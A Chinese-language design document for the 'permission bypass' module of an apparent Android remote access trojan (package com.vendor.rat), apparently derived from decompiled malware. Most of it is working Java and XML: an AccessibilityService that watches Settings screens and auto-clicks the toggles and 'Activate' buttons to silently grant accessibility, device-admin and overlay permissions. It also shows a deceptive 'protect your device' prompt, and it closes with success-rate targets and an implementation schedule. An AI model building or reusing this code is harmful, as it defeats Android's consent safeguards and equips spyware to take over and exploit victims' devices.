# 模块 02：权限绕过模块设计文档

> **模块名称**: Permission Bypass Module
> **优先级**: P0（极高）
> **依赖**: 无障碍服务（AccessibilityService）
> **版本**: 1.0
> **日期**: 2026-03-16

---

## 一、模块概述

### 1.1 功能描述

权限绕过模块通过无障碍服务（AccessibilityService）自动点击系统设置界面，绕过所有权限限制，实现静默授权。

### 1.2 支持的权限类型

| 权限类型 | 说明 | 绕过难度 | 成功率 |
|---------|------|---------|--------|
| 无障碍服务 | AccessibilityService | ⭐⭐ | 95% |
| 设备管理员 | DeviceAdmin | ⭐⭐⭐ | 98% |
| 自启动 | AutoStart | ⭐⭐⭐⭐⭐⭐ | 60-92% |
| 电池优化 | Battery Optimization | ⭐⭐⭐⭐⭐⭐ | 55-90% |
| 后台运行 | Background Activity | ⭐⭐⭐⭐⭐⭐ | 60-90% |
| 关联启动 | Associated Startup | ⭐⭐⭐⭐⭐⭐⭐ | 60% |
| 悬浮窗 | Overlay Permission | ⭐⭐⭐⭐ | 85% |

### 1.3 架构设计

```
┌─────────────────────────────────────────────────────────┐
│           MyAccessibilityService (核心服务)              │
│  - 监听窗口变化事件                                       │
│  - 分发事件到各个引擎                                     │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│              EngineManager (引擎管理器)                  │
│  - 注册/注销引擎                                          │
│  - 事件分发                                               │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                 AutoEngine (引擎基类)                    │
│  - 窗口匹配                                               │
│  - 超时控制                                               │
│  - 状态管理                                               │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│              厂商适配引擎（继承 AutoEngine）              │
│  ├─ AccessibilityEngine (无障碍服务)                     │
│  ├─ DeviceAdminEngine (设备管理员)                       │
│  └─ OverlayEngine (悬浮窗)                               │
└─────────────────────────────────────────────────────────┘
```

---

## 二、核心类设计

### 2.1 MyAccessibilityService

**基于**: `com/guard/wallet/service/MyAccessibilityService.java`

```java
package com.vendor.rat.service;

public class MyAccessibilityService extends AccessibilityService {
    private EngineManager engineManager;

    @Override
    public void onCreate() {
        super.onCreate();
        engineManager = new EngineManager(this);
        registerEngines();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String packageName = event.getPackageName().toString();
        String className = event.getClassName().toString();

        // 分发事件到所有注册的引擎
        engineManager.dispatch(packageName, className, event);
    }

    private void registerEngines() {
        // 注册无障碍服务引擎
        engineManager.register("accessibility", new AccessibilityEngine(this));

        // 注册设备管理员引擎
        engineManager.register("device_admin", new DeviceAdminEngine(this));

        // 注册悬浮窗引擎
        engineManager.register("overlay", new OverlayEngine(this));
    }

    @Override
    public void onInterrupt() {
        // 服务中断
    }

    @Override
    public void onDestroy() {
        engineManager.unregisterAll();
        super.onDestroy();
    }
}
```

### 2.2 EngineManager

```java
package com.vendor.rat.service;

public class EngineManager {
    private ConcurrentHashMap<String, AutoEngine> engines;
    private AccessibilityService service;

    public EngineManager(AccessibilityService service) {
        this.service = service;
        this.engines = new ConcurrentHashMap<>();
    }

    public void register(String id, AutoEngine engine) {
        engines.put(id, engine);
    }

    public void unregister(String id) {
        AutoEngine engine = engines.remove(id);
        if (engine != null) {
            engine.destroy();
        }
    }

    public void unregisterAll() {
        for (AutoEngine engine : engines.values()) {
            engine.destroy();
        }
        engines.clear();
    }

    public void dispatch(String packageName, String className, AccessibilityEvent event) {
        for (AutoEngine engine : engines.values()) {
            if (engine.matchWindow(packageName, className)) {
                engine.onWindowMatched(packageName, className, event);
            }
        }
    }
}
```

### 2.3 AutoEngine (基类)

**基于**: `o/c.java`

```java
package com.vendor.rat.auto.engine;

public abstract class AutoEngine {
    protected AccessibilityService service;
    protected List<WindowMatcher> windowMatchers;
    protected ScheduledExecutorService timeoutTimer;
    protected AtomicBoolean completed;
    protected AtomicBoolean running;

    public AutoEngine(AccessibilityService service, List<WindowMatcher> matchers) {
        this.service = service;
        this.windowMatchers = matchers;
        this.timeoutTimer = Executors.newSingleThreadScheduledExecutor();
        this.completed = new AtomicBoolean(false);
        this.running = new AtomicBoolean(false);
    }

    // 子类实现
    protected abstract void onWindowMatched(String pkg, String cls, AccessibilityEvent event);
    protected abstract void execute();

    // 窗口匹配
    public boolean matchWindow(String pkg, String cls) {
        for (WindowMatcher matcher : windowMatchers) {
            if (matcher.match(pkg, cls)) {
                return true;
            }
        }
        return false;
    }

    // 启动引擎
    public void start(long timeoutSeconds) {
        if (running.get()) return;

        running.set(true);
        timeoutTimer.schedule(() -> {
            if (!completed.get()) {
                timeout();
            }
        }, timeoutSeconds, TimeUnit.SECONDS);

        execute();
    }

    // 完成
    public void finish() {
        completed.set(true);
        running.set(false);
        timeoutTimer.shutdown();
    }

    // 超时
    protected void timeout() {
        finish();
    }

    // 销毁
    public void destroy() {
        finish();
    }

    // 按 HOME 键
    protected void pressHome() {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    // 按 BACK 键
    protected void pressBack() {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }

    // 获取根节点
    protected AccessibilityNodeInfo getRootNode() {
        return service.getRootInActiveWindow();
    }
}
```

### 2.4 WindowMatcher

```java
package com.vendor.rat.auto.engine;

public class WindowMatcher {
    private String packageName;
    private String className;
    private boolean exactMatch;

    public WindowMatcher(String packageName, String className, boolean exactMatch) {
        this.packageName = packageName;
        this.className = className;
        this.exactMatch = exactMatch;
    }

    public boolean match(String pkg, String cls) {
        if (exactMatch) {
            return packageName.equals(pkg) && className.equals(cls);
        } else {
            return pkg.contains(packageName) && cls.contains(className);
        }
    }
}
```

---

## 三、权限引擎实现

### 3.1 AccessibilityEngine (无障碍服务)

```java
package com.vendor.rat.auto.engine;

public class AccessibilityEngine extends AutoEngine {
    private static final String SETTINGS_PKG = "com.android.settings";
    private static final String ACCESSIBILITY_ACTIVITY = "AccessibilitySettingsActivity";

    public AccessibilityEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        matchers.add(new WindowMatcher(SETTINGS_PKG, ACCESSIBILITY_ACTIVITY, false));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(30); // 30 秒超时
        }
    }

    @Override
    protected void execute() {
        // 1. 查找应用名称
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        String appName = service.getString(R.string.app_name);
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(appName);

        if (nodes.isEmpty()) {
            // 滚动查找
            scrollForward(root);
            return;
        }

        // 2. 点击应用
        AccessibilityNodeInfo targetNode = nodes.get(0);
        clickNode(targetNode);

        // 3. 等待开关界面
        new Handler().postDelayed(() -> {
            enableAccessibility();
        }, 1000);
    }

    private void enableAccessibility() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找开关
        List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId(
            "android:id/switch_widget"
        );

        if (!switches.isEmpty()) {
            AccessibilityNodeInfo switchNode = switches.get(0);
            if (!switchNode.isChecked()) {
                clickNode(switchNode);
            }
        }

        // 完成
        finish();
        pressBack();
    }

    private void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }

    private void scrollForward(AccessibilityNodeInfo root) {
        if (root == null) return;

        // 查找可滚动节点
        List<AccessibilityNodeInfo> scrollables = findScrollableNodes(root);
        if (!scrollables.isEmpty()) {
            scrollables.get(0).performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
        }
    }

    private List<AccessibilityNodeInfo> findScrollableNodes(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        if (root == null) return result;

        if (root.isScrollable()) {
            result.add(root);
        }

        for (int i = 0; i < root.getChildCount(); i++) {
            result.addAll(findScrollableNodes(root.getChild(i)));
        }

        return result;
    }
}
```

### 3.2 DeviceAdminEngine (设备管理员)

```java
package com.vendor.rat.auto.engine;

public class DeviceAdminEngine extends AutoEngine {
    private static final String SETTINGS_PKG = "com.android.settings";
    private static final String DEVICE_ADMIN_ACTIVITY = "DeviceAdminSettings";

    public DeviceAdminEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        matchers.add(new WindowMatcher(SETTINGS_PKG, DEVICE_ADMIN_ACTIVITY, false));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(30);
        }
    }

    @Override
    protected void execute() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找"激活"按钮
        List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByText("激活");
        if (buttons.isEmpty()) {
            buttons = root.findAccessibilityNodeInfosByText("Activate");
        }

        if (!buttons.isEmpty()) {
            clickNode(buttons.get(0));
            finish();
        }
    }

    private void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }
}
```

### 3.3 OverlayEngine (悬浮窗)

```java
package com.vendor.rat.auto.engine;

public class OverlayEngine extends AutoEngine {
    private static final String SETTINGS_PKG = "com.android.settings";
    private static final String OVERLAY_ACTIVITY = "AppDrawOverlaySettings";

    public OverlayEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        matchers.add(new WindowMatcher(SETTINGS_PKG, OVERLAY_ACTIVITY, false));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(30);
        }
    }

    @Override
    protected void execute() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找开关
        List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId(
            "android:id/switch_widget"
        );

        if (!switches.isEmpty()) {
            AccessibilityNodeInfo switchNode = switches.get(0);
            if (!switchNode.isChecked()) {
                clickNode(switchNode);
            }
        }

        finish();
        pressBack();
    }

    private void clickNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }
}
```

---

## 四、权限请求流程

### 4.1 无障碍服务

```java
public class PermissionHelper {
    public static void requestAccessibility(Context context) {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static boolean isAccessibilityEnabled(Context context) {
        String service = context.getPackageName() + "/.service.MyAccessibilityService";
        int enabled = 0;
        try {
            enabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            return false;
        }

        if (enabled == 1) {
            String services = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return services != null && services.contains(service);
        }

        return false;
    }
}
```

### 4.2 设备管理员

```java
public class DeviceAdminHelper {
    public static void requestDeviceAdmin(Context context) {
        ComponentName adminComponent = new ComponentName(
            context, MyDeviceAdminReceiver.class);

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "需要设备管理员权限以保护您的设备");
        context.startActivity(intent);
    }

    public static boolean isDeviceAdminEnabled(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager)
            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(
            context, MyDeviceAdminReceiver.class);
        return dpm.isAdminActive(adminComponent);
    }
}
```

### 4.3 悬浮窗

```java
public class OverlayHelper {
    public static void requestOverlay(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + context.getPackageName())
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    public static boolean canDrawOverlays(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context);
        }
        return true;
    }
}
```

---

## 五、配置文件

### 5.1 AccessibilityService 配置

**文件**: `res/xml/accessibility_service_config.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="100"
    android:packageNames="com.android.settings" />
```

### 5.2 DeviceAdminReceiver

```java
public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 设备管理员已启用
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        // 设备管理员已禁用
    }
}
```

**AndroidManifest.xml**:
```xml
<receiver
    android:name=".receiver.MyDeviceAdminReceiver"
    android:permission="android.permission.BIND_DEVICE_ADMIN">
    <meta-data
        android:name="android.app.device_admin"
        android:resource="@xml/device_admin" />
    <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>
```

---

## 六、实施计划

### Phase 1: 基础框架（3 天）

- [ ] MyAccessibilityService 实现
- [ ] EngineManager 实现
- [ ] AutoEngine 基类
- [ ] WindowMatcher 实现

### Phase 2: 权限引擎（4 天）

- [ ] AccessibilityEngine
- [ ] DeviceAdminEngine
- [ ] OverlayEngine
- [ ] PermissionHelper

### Phase 3: 测试（2 天）

- [ ] 单元测试
- [ ] 真机测试（原生 Android）
- [ ] 调试优化

**总计**: 9 天

---

## 七、验收标准

| 功能 | 验收标准 |
|------|---------|
| 无障碍服务 | 自动启用成功率 > 90% |
| 设备管理员 | 自动激活成功率 > 95% |
| 悬浮窗 | 自动授权成功率 > 85% |
| 窗口匹配 | 准确识别目标界面 |
| 超时控制 | 30 秒内完成或超时 |

---

**文档版本**: 1.0
**最后更新**: 2026-03-16
**负责人**: 权限绕过组
